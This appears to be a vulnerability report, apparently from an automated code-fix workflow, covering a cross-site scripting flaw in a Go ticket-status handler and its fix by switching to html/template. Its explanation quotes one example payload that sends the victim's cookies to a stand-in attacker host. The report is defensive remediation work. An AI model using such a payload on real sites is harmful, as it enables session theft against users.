## Verdict

Exploitable. CWE-79 (Cross-Site Scripting), high confidence.

## Source

Source: `r.URL.Query().Get("subject")` in `ticketStatusHandler` (line 18) - an attacker-controlled HTTP query parameter, read with no validation or encoding.

Sink: `ticketPage.Execute(w, data)` (line 28). `ticketPage` is parsed with `text/template`, which performs no output escaping, and the handler serves the result with `Content-Type: text/html`. The `Subject` field of `data` carries the tainted value straight from source to sink with no transformation in between, so a value such as `<script>document.location='//evil.example/?c='+document.cookie</script>` is written verbatim into the HTML response and executes in the victim's browser.

Sink contract: `Execute` writes directly to the `http.ResponseWriter` and returns an `error` that the handler already discards (unchanged before and after the fix); it takes no encoding-related argument to adjust. Nothing about the call's return value or failure behavior needs to change to fix this - the defect is the choice of package that parsed the template, not an argument to `Execute`.

## Fix

`text/template` performs no HTML-aware escaping at all; `html/template` provides a drop-in-compatible API (`New`, `Parse`, `Must`, `Execute`) that automatically HTML-escapes `{{.Subject}}` for its output context. The only change needed is the import path.

### File: TextTemplateForHtmlOutput.go
```go
package main

import (
	"html/template"
	"net/http"
)

var ticketPage = template.Must(template.New("ticket").Parse(`
	<html>
		<body>
			<h2>Ticket Status</h2>
			<p>Subject: {{.Subject}}</p>
		</body>
	</html>
`))

func ticketStatusHandler(w http.ResponseWriter, r *http.Request) {
	subject := r.URL.Query().Get("subject")

	data := struct {
		Subject string
	}{
		Subject: subject,
	}

	w.Header().Set("Content-Type", "text/html")
	ticketPage.Execute(w, data)
}

func main() {
	http.HandleFunc("/ticket/status", ticketStatusHandler)
	http.ListenAndServe(":8080", nil)
}
```

## Explanation

The single-line change swaps the `text/template` import for `html/template`. Both packages expose the same `New`/`Parse`/`Must`/`Execute` API, so no other line changes. `html/template` parses the template with context-aware auto-escaping: because `{{.Subject}}` sits in an HTML body context, the escaper HTML-encodes `<`, `>`, `&`, `"`, and `'` in the `Subject` value before writing it, so an injected `<script>` or event-handler payload renders as inert text instead of executing. This closes the injection at the sink itself rather than relying on the caller to sanitize `subject` before it reaches the template, and it generalizes to any other field added to the template later.

## Behaviour changes

None beyond closing the weakness. `Execute`'s signature, return value (discarded `error`), and failure behavior are unchanged. The one observable difference is that `Subject` values containing `<`, `>`, `&`, `"`, or `'` now render HTML-escaped (e.g. a subject of `Router & Switch` now displays as `Router &amp; Switch` in page source, rendering identically in the browser) instead of being emitted raw - this is the intended effect of the fix, not a side effect, and legitimate plain-text subjects are unaffected.

Verification: copied the fixed file into a scratch Go module (`module gofix`, `go 1.25`, no external dependencies) and ran `go build` and `go vet` offline (`GOPROXY=off`) against it - both completed with exit code 0 and no diagnostics. Confirmed `html/template` exposes the same `New`, `Parse`, `Must`, and `Execute` identifiers used by the original code (Go standard library, `html/template` package).

Assumptions: none - the finding's line, source, and sink were unambiguous from the provided file, and the CWE-79 Go guidance directly names this exact pattern (`text/template` used for browser-facing HTML output).
